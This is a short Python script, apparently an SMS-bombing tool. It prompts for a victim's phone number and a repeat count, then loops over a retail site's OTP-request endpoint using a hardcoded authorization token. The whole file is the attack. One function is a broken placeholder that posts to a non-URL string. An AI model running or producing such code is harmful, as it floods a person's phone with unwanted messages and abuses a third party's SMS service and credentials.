import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama
phone = input("[✓] | 𝚙𝚑𝚘𝚗𝚎 : ")
print("")
NUM = int(input("[✓] | 𝙽𝚞𝚖 : "))

def api1():
	requests.post("เอพีไอ")
	print ("ok")
	
for i in range(NUM):

      requests.post("https://api-globalhouse.com/sms/requestOTP",json={"phoneNumber":phone},headers={"content-type": "application/json; charset=utf-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJBUFAtU2VydmljZSIsImlhdCI6MTYxMDgwNjQ0NDQxM30.0BWQpa9RO61bUpI45ncdngikQX0xmy2fwsRtZsZNlCc"}).text
	  
